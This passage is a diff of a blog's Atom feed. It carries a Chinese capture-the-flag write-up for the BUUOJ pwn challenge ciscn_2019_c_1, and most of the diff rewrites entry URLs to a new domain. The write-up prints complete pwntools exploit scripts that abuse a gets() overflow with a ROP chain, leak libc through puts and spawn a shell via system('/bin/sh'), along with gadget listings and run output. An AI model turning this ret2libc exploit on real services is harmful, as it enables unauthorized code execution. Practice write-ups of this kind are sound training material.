class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">28565</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">puts_addr = u64(sh.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_offset + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p>checksec结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   85) Symbols       No    0               1               ciscn_2019_c_1</span><br></pre></td></tr></table></figure><p>拖入ida64分析，<code>main</code>函数没有什么价值，就是判断输入内容，1就调用<code>encrypt</code>函数；2就让你自己解密，他不管；3就结束。</p><p>唯一可以看的就一个加密函数，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚进函数，就有一个gets入眼，那么搜索一下危险函数，然而并没有任何发现。那这题就只能自己构造ROP去调用system(‘/bin/sh’)了，这里利用puts函数来计算地址。</p><p>首先用ROPgadget搜一下pop rdi ; ret和ret</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c82 : pop r15 ; ret</span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007f0 : pop rbp ; ret</span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br><span class="line">                                                                                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&quot;ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>找到pop rdi ; ret地址<code>0x400c83</code>，ret地址<code>0x4006b9</code>。</p><p>首先需要泄露出puts函数的地址，这样才能算出system函数和字符串/bin/sh的地址。为了节省时间，第一个字符用<code>\x00</code>来绕过strlen以此来跳过循环加密。因为后面还需要调用<code>system('/bin/sh')</code>，因此还需要再执行一次main函数。</p><p>根据以上条件构造出第一个payload：<code>payload1 = b'\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</code></p><p>先用这部分看看输出情况，写出如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25980</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload1)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 exp.py                                                                                                                             1 ⨯</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>: pid 3461</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Desktop/ciscn_2019_c_1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">4196064</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Ciphertext</span><br><span class="line"></span><br><span class="line">\xf0\x85j\xe0\x7f</span><br><span class="line">EEEEEEE                            hh      iii                </span><br><span class="line">EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  </span><br><span class="line">EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e </span><br><span class="line">EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  </span><br><span class="line">EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee </span><br><span class="line">====================================================================</span><br><span class="line">Welcome to this Encryption machine</span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line">1.Encrypt</span><br><span class="line">2.Decrypt</span><br><span class="line">3.Exit</span><br><span class="line">Input your choice!</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>从上面可以看到puts函数的地址被泄露出来了，接下来就是用LibcSearcher来搜索puts的在libc中的地址，然后计算偏移量，再用system和/bin/sh在libc中的地址加上偏移量得到真实地址。然后再溢出调用system(‘/bin/sh’)。</p><p>最终脚本如下：</p><blockquote><p>ps: 这边不知道为什么，我本地libc用2.31的EOF，然后我指定用2.27直接EOF，输入都不给输入。。但是buu的服务器上面上去让我选又得选那个2.27的才能正常通过……迷惑。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">file_name = <span class="string">&#x27;./ciscn_2019_c_1&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">28565</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> is_debug:</span><br><span class="line">sh = process(file_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">_start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">puts_addr = u64(sh.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x57</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
     
     
       
@@ -61,19 +115,19 @@
     
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/categories/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/tags/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>jarvisoj_level0</title>
-    <link href="https://ruom0.github.io/2021/06/18/buuoj/jarvisoj_level0/"/>
-    <id>https://ruom0.github.io/2021/06/18/buuoj/jarvisoj_level0/</id>
+    <link href="https://www.ruomo.fun/2021/06/18/buuoj/jarvisoj_level0/"/>
+    <id>https://www.ruomo.fun/2021/06/18/buuoj/jarvisoj_level0/</id>
     <published>2021-06-18T03:20:17.360Z</published>
     <updated>2021-06-18T04:24:16.508Z</updated>
     
@@ -88,19 +142,19 @@
     
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/categories/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/tags/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>pwn1_sctf_2016</title>
-    <link href="https://ruom0.github.io/2021/06/18/buuoj/pwn1_sctf_2016/"/>
-    <id>https://ruom0.github.io/2021/06/18/buuoj/pwn1_sctf_2016/</id>
+    <link href="https://www.ruomo.fun/2021/06/18/buuoj/pwn1_sctf_2016/"/>
+    <id>https://www.ruomo.fun/2021/06/18/buuoj/pwn1_sctf_2016/</id>
     <published>2021-06-18T02:52:13.087Z</published>
     <updated>2021-06-18T04:24:33.681Z</updated>
     
@@ -115,19 +169,19 @@
     
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/categories/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/tags/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>ciscn_2019_n_1</title>
-    <link href="https://ruom0.github.io/2021/06/18/buuoj/ciscn_2019_n_1/"/>
-    <id>https://ruom0.github.io/2021/06/18/buuoj/ciscn_2019_n_1/</id>
+    <link href="https://www.ruomo.fun/2021/06/18/buuoj/ciscn_2019_n_1/"/>
+    <id>https://www.ruomo.fun/2021/06/18/buuoj/ciscn_2019_n_1/</id>
     <published>2021-06-18T02:00:38.993Z</published>
     <updated>2021-06-18T04:24:03.634Z</updated>
     
@@ -142,19 +196,19 @@
     
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/categories/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/tags/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>warmup_csaw_2016</title>
-    <link href="https://ruom0.github.io/2021/06/17/buuoj/warmup_csaw_2016/"/>
-    <id>https://ruom0.github.io/2021/06/17/buuoj/warmup_csaw_2016/</id>
+    <link href="https://www.ruomo.fun/2021/06/17/buuoj/warmup_csaw_2016/"/>
+    <id>https://www.ruomo.fun/2021/06/17/buuoj/warmup_csaw_2016/</id>
     <published>2021-06-17T02:49:12.314Z</published>
     <updated>2021-06-18T04:25:29.351Z</updated>
     
@@ -169,19 +223,19 @@
     
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/categories/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/tags/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>rip1</title>
-    <link href="https://ruom0.github.io/2021/06/17/buuoj/rip1/"/>
-    <id>https://ruom0.github.io/2021/06/17/buuoj/rip1/</id>
+    <link href="https://www.ruomo.fun/2021/06/17/buuoj/rip1/"/>
+    <id>https://www.ruomo.fun/2021/06/17/buuoj/rip1/</id>
     <published>2021-06-17T02:22:07.616Z</published>
     <updated>2021-06-18T06:04:12.707Z</updated>
     
@@ -196,19 +250,19 @@
     
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/categories/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/categories/buuoj/"/>
     
     
-    <category term="buuoj" scheme="https://ruom0.github.io/tags/buuoj/"/>
+    <category term="buuoj" scheme="https://www.ruomo.fun/tags/buuoj/"/>
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
   </entry>
   
   <entry>
     <title>pwn环境配置（kali虚拟机）</title>
-    <link href="https://ruom0.github.io/2021/06/13/others/pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE(kali%E8%99%9A%E6%8B%9F%E6%9C%BA)/"/>
-    <id>https://ruom0.github.io/2021/06/13/others/pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE(kali%E8%99%9A%E6%8B%9F%E6%9C%BA)/</id>
+    <link href="https://www.ruomo.fun/2021/06/13/others/pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE(kali%E8%99%9A%E6%8B%9F%E6%9C%BA)/"/>
+    <id>https://www.ruomo.fun/2021/06/13/others/pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE(kali%E8%99%9A%E6%8B%9F%E6%9C%BA)/</id>
     <published>2021-06-13T08:33:20.949Z</published>
     <updated>2021-06-18T04:13:41.888Z</updated>
     
@@ -228,19 +282,19 @@
     
     
     
-    <category term="others" scheme="https://ruom0.github.io/categories/others/"/>
+    <category term="others" scheme="https://www.ruomo.fun/categories/others/"/>
     
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
-    <category term="kali" scheme="https://ruom0.github.io/tags/kali/"/>
+    <category term="kali" scheme="https://www.ruomo.fun/tags/kali/"/>
     
   </entry>
   
   <entry>
     <title>input</title>
-    <link href="https://ruom0.github.io/2021/06/04/pwnable/Toddlers_Bottle/input/"/>
-    <id>https://ruom0.github.io/2021/06/04/pwnable/Toddlers_Bottle/input/</id>
+    <link href="https://www.ruomo.fun/2021/06/04/pwnable/Toddlers_Bottle/input/"/>
+    <id>https://www.ruomo.fun/2021/06/04/pwnable/Toddlers_Bottle/input/</id>
     <published>2021-06-04T07:27:47.951Z</published>
     <updated>2021-06-04T09:45:00.662Z</updated>
     
@@ -255,19 +309,19 @@
     
     
     
-    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
     
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
-    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
     
   </entry>
   
   <entry>
     <title>random</title>
-    <link href="https://ruom0.github.io/2021/06/04/pwnable/Toddlers_Bottle/random/"/>
-    <id>https://ruom0.github.io/2021/06/04/pwnable/Toddlers_Bottle/random/</id>
+    <link href="https://www.ruomo.fun/2021/06/04/pwnable/Toddlers_Bottle/random/"/>
+    <id>https://www.ruomo.fun/2021/06/04/pwnable/Toddlers_Bottle/random/</id>
     <published>2021-06-04T07:17:07.433Z</published>
     <updated>2021-06-04T07:26:46.352Z</updated>
     
@@ -282,19 +336,19 @@
     
     
     
-    <category term="pwnable" scheme="https://ruom0.github.io/categories/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/categories/pwnable/"/>
     
     
-    <category term="pwn" scheme="https://ruom0.github.io/tags/pwn/"/>
+    <category term="pwn" scheme="https://www.ruomo.fun/tags/pwn/"/>
     
-    <category term="pwnable" scheme="https://ruom0.github.io/tags/pwnable/"/>
+    <category term="pwnable" scheme="https://www.ruomo.fun/tags/pwnable/"/>
     
   </entry>
   
   <entry>
     <title>passcode</title>
-    <link href="https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/passcode/"/>
-    <id>https://ruom0.github.io/2021/06/03/pwnable/Toddlers_Bottle/passcode/</id>
+    <link href="https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/passcode/"/>
+    <id>https://www.ruomo.fun/2021/06/03/pwnable/Toddlers_Bottle/passcode/</id>
     <published>2021-06-03T12:38:54.259Z</published>
